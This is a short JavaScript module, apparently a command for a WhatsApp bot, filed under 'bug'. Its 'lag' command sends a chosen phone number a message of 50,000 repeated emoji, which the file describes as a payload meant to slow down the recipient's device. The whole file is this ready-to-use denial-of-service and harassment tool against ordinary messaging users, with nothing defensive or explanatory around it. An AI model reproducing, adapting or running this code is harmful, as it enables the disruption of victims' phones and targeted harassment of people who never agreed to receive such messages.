module.exports = {
  name: 'lag',
  alias: [],
  description: 'Sends a lag message that can slow down some devices',
  category: 'bug',

  async run(bot, msg, args, platform) {
    const target = args[0];

    if (!target) {
      return bot.sendMessage(msg.chat.id, '⚠️ Please provide a number or mention.\n\nExample:\n.lag 233XXXXXXXXX');
    }

    // Generate a lag message payload
    const lagText = "👾".repeat(50000); // 50K emoji payload

    try {
      await bot.sendMessage(target + '@s.whatsapp.net', lagText);
      await bot.sendMessage(msg.chat.id, `✅ Lag message sent to ${target}`);
    } catch (e) {
      await bot.sendMessage(msg.chat.id, `❌ Failed to send lag message.\n\n${e.message}`);
    }
  }
};
